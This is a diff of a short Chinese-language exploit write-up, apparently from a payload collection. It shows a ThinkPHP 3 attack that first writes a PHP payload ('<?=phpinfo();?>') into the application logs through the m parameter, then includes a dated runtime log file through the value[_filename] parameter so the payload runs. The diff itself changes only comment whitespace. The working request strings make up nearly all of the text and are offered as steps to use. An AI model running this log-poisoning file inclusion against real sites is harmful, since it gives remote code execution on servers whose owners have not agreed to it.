@@ -7,10 +7,10 @@
 ```shell
 # step1 插入payload到日志
 index.php?m=--><?=phpinfo();?>
-# step2 包含已插入恶意代码的日志文件
-## 
+# step2 包含已插入恶意代码的日志文件 
 /tp3/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_07_12.log
 /tp3/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/21_07_12.log
+
 ```
 **效果**
 ![image](https://user-images.githubusercontent.com/55024146/125297390-c3b5d400-e359-11eb-91f3-36bc92f368be.png)
